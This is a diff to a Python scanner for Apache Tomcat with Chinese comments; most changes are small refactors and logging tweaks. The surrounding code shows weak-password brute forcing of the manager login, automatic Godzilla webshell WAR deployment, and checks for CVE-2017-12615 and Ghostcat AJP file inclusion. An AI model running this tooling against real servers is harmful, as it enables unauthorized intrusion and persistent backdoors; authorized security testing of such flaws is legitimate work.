@@ -15,6 +15,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
 
 import requests
+import urllib3
 import yaml
 from bs4 import BeautifulSoup
 from colorama import Fore, Style
@@ -23,10 +24,8 @@ from requests.auth import HTTPBasicAuth
 from common.common import getRandomUserAgent
 from model.Tomcat import Tomcat
 
-# from model import Tomcat, AjpForwardRequest
-
 # 忽略HTTPS请求中的不安全请求警告
-requests.packages.urllib3.disable_warnings()
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 配置日志格式，输出INFO级别及以上的日志消息
 logging.basicConfig(level=logging.INFO, format='%(message)s')
@@ -299,7 +298,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
                                                 config['retry']['deploy_godzilla_war']['max_retries'],
                                                 config['retry']['deploy_godzilla_war']['retry_delay'])
                         # 返回成功登录的URL、用户名和密码
-                        return (url_with_path, username, password)
+                        return url_with_path, username, password
                     else:
                         # 记录登录失败的信息
                         logger.info(
@@ -309,7 +308,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
         except requests.exceptions.RequestException as e:
             # 记录网站无法访问的警告信息
             logger.warning(
-                f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
+                f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL} {Fore.WHITE}({e})")
             # 重试前等待
             time.sleep(retry_delay)
             # 增加重试次数
@@ -322,7 +321,6 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
 
     # 如果没有成功登录，返回URL和None值
     return url, None, None
-
 
 
 # 动态调整线程池大小，确保资源使用合理
@@ -440,7 +438,7 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
             lfi_check = config['cnvd_2020_10487']['lfi_check']  #
 
             # 初始化Tomcat AJP连接
-            t = Tomcat(target_host, target_port)
+            t = Tomcat.Tomcat(target_host, target_port)
 
             # 发送请求，尝试进行LFI (本地文件包含)
             _, data = t.perform_request('/asdf', attributes=[
@@ -462,6 +460,8 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
         return False, None, None  # 如果两个漏洞都未被利用成功，返回默认的失败值
 
     except requests.exceptions.RequestException as e:
+        logger.warning(
+            f"{Fore.YELLOW}{str(e)} ")
         return False, None, None
 
 
@@ -492,8 +492,6 @@ def detect_and_check(url, usernames, passwords, output_file, config, proxies):
                         config['retry']['check_weak_password']['retry_delay'],
                         config,
                         proxies)
-
-
 
 
 # 主函数
